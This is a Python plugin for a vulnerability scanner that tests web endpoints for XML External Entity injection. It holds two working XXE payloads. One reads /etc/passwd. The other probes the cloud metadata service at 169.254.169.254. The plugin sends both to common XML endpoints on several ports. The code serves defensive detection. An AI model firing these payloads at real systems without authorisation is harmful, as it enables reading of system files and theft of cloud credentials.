import asyncio
from plugins import NaslPlugin, PluginResult


class XxeDetectionPlugin(NaslPlugin):
    PLUGIN_ID = 1350
    NAME = "XML External Entity (XXE) Detection"
    DESCRIPTION = "Tests for XML External Entity injection vulnerabilities by sending XML payloads with external entity definitions to endpoints that process XML (SOAP, REST APIs, file uploads, etc.)."
    SOLUTION = "Disable external entity processing and DTD loading in XML parsers. Use less complex data formats like JSON. Apply input validation and output encoding."
    CVSS_SCORE = 7.5
    SEVERITY = "High"
    FAMILY = "Web Security"
    CVE = []
    PORTS = [80, 443, 8080, 8443]

    async def check_target(self, target: str, port: int | None = None) -> list[PluginResult]:
        results = []
        xxe_payloads = [
            ("""<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>""", "File read XXE"),
            ("""<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>""", "SSRF XXE"),
        ]
        xml_endpoints = ["/", "/api", "/api/v1", "/soap", "/xmlrpc.php", "/api/xml"]
        for p in ([port] if port else self.PORTS):
            found = []
            for endpoint in xml_endpoints:
                for payload, desc in xxe_payloads:
                    try:
                        reader, writer = await asyncio.wait_for(
                            asyncio.open_connection(target, p), timeout=5
                        )
                        request = (
                            f"POST {endpoint} HTTP/1.1\r\n"
                            f"Host: {target}:{p}\r\n"
                            f"Content-Type: application/xml\r\n"
                            f"Content-Length: {len(payload)}\r\n"
                            f"User-Agent: CentraScanner/1.0\r\n"
                            f"Connection: close\r\n\r\n"
                            f"{payload}"
                        )
                        writer.write(request.encode())
                        await writer.drain()
                        resp = await asyncio.wait_for(reader.read(8192), timeout=5)
                        writer.close()
                        await writer.wait_closed()
                        body = resp.decode("utf-8", errors="replace")
                        if "root:" in body or "meta-data" in body or "ami-" in body or "nobody:" in body:
                            found.append(f"{desc} on {endpoint}")
                            break
                    except Exception:
                        continue
            if found:
                results.append(PluginResult(
                    vulnerable=True, target=target, port=p,
                    cvss_score=self.CVSS_SCORE, severity=self.SEVERITY,
                    description=f"{self.DESCRIPTION} XXE vulnerability on port {p}",
                    solution=self.SOLUTION,
                    evidence="; ".join(found),
                    references=["https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing"]
                ))
            else:
                results.append(PluginResult(
                    vulnerable=False, target=target, port=p,
                    cvss_score=0, severity="Info",
                    description=f"No XXE detected on port {p}",
                    solution="", evidence="", references=[]
                ))
        return results
